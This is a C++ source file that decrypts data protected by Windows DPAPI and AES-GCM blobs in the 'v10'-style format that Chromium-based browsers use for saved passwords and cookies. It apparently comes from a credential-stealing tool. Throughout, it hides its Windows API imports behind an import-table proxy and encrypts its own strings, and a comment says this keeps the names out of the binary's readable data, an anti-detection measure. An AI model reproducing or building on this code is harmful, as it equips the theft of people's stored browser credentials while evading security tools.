#include "crypto_helper.h"
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdexcept>
#include <vector>
#include <windows.h>
#include <obfuscation/iat_proxy.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace crypto_helper
{
    std::vector<BYTE> dpapi_unprotect(const std::vector<BYTE>& encrypted, const std::vector<BYTE>* entropy)
    {
        DATA_BLOB inBlob{};
        DATA_BLOB outBlob{};
        DATA_BLOB entropyBlob{};

        inBlob.pbData = const_cast<BYTE*>(encrypted.data());
        inBlob.cbData = static_cast<DWORD>(encrypted.size());

        if (entropy && !entropy->empty()) {
            entropyBlob.pbData = const_cast<BYTE*>(entropy->data());
            entropyBlob.cbData = static_cast<DWORD>(entropy->size());
        }

        if (!iat::crypt_unprotect_data(&inBlob, nullptr, entropy ? &entropyBlob : nullptr,
                                        nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &outBlob))
            return {};

        std::vector<BYTE> result(outBlob.pbData, outBlob.pbData + outBlob.cbData);
        LocalFree(outBlob.pbData);
        return result;
    }

    std::vector<BYTE> aes_gcm_decrypt(const std::vector<BYTE>& encrypted, const std::vector<BYTE>& key)
    {
        if (encrypted.size() < 3 + 12 + 16)
            throw std::runtime_error("short");
        if (key.size() != 16 && key.size() != 32)
            throw std::runtime_error("keysize");
        if (encrypted[0] != 'v' || !isdigit((unsigned char)encrypted[1]) || !isdigit((unsigned char)encrypted[2]))
            throw std::runtime_error("prefix");

        const size_t prefix_len = 3;
        const size_t iv_len     = 12;
        const size_t tag_len    = 16;

        const BYTE* iv          = encrypted.data() + prefix_len;
        const BYTE* ciphertext  = encrypted.data() + prefix_len + iv_len;
        const size_t ct_len     = encrypted.size() - prefix_len - iv_len - tag_len;
        const BYTE* tag         = encrypted.data() + encrypted.size() - tag_len;

        PVOID hAlg = nullptr;
        PVOID hKey = nullptr;
        NTSTATUS status;

        //bcrypt algorithm jazz, dont want to appear as wchar in .rdata
        status = iat::bcrypt_open_algo(&hAlg, skCrypt(L"AES"), nullptr, 0);
        if (status != 0) throw std::runtime_error("open_algo");

        status = iat::bcrypt_set_property(hAlg, skCrypt(L"ChainingMode"),
            (PUCHAR)skCrypt(L"ChainingModeGCM"), sizeof(L"ChainingModeGCM"), 0);
        if (status != 0) { iat::bcrypt_close_algo(hAlg, 0); throw std::runtime_error("set_prop"); }

        status = iat::bcrypt_gen_sym_key(hAlg, &hKey, nullptr, 0,
            (PUCHAR)key.data(), (ULONG)key.size(), 0);
        if (status != 0) { iat::bcrypt_close_algo(hAlg, 0); throw std::runtime_error("gen_key"); }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = const_cast<BYTE*>(iv);
        authInfo.cbNonce = (ULONG)iv_len;
        authInfo.pbTag   = const_cast<BYTE*>(tag);
        authInfo.cbTag   = (ULONG)tag_len;

        std::vector<BYTE> decrypted(ct_len);
        ULONG result_len = 0;

        status = iat::bcrypt_decrypt(hKey, const_cast<BYTE*>(ciphertext), (ULONG)ct_len,
            &authInfo, nullptr, 0, decrypted.data(), (ULONG)decrypted.size(), &result_len, 0);

        iat::bcrypt_destroy_key(hKey);
        iat::bcrypt_close_algo(hAlg, 0);

        if (status != 0) throw std::runtime_error("decrypt");

        decrypted.resize(result_len);
        return decrypted;
    }
}
